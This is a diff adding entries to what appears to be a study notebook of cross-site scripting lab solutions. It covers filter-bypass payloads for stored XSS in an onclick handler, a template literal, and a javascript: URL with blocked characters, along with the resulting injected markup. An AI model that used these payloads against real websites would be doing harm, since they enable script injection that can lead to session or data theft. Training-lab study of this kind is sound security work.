@@ -120,9 +120,30 @@ t/?test=here%09'accesskey='X'%09onclick='alert(1)
 
 `\';alert(document.domain)//`
 
+19. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+```
+http://foo?&apos;-alert(1)-&apos;
+
+http://ewq.com&#39;);alert(document.domain+&#39;
+
+<a id="author" href="http://ewq.com');alert(document.domain+'" onclick="var tracker={track(){}};tracker.track('http://ewq.com');alert(document.domain+'');">asd</a>
+```
+
+20. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+`${alert(1)}`
+
+21. Reflected XSS in a JavaScript URL with some characters blocked
+
+```
+/post?postId=4&'},x=x=>{onerror=alert;throw/**/1337},toString=x,window+'',{'
+
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},x%3dx%3d%3e{onerror%3dalert%3bthrow/**/1337},toString%3dx,window+%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
 
 
-
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4'}).finally(_ => window.location = '/')">Back to Blog</a>
+```
 
 
 
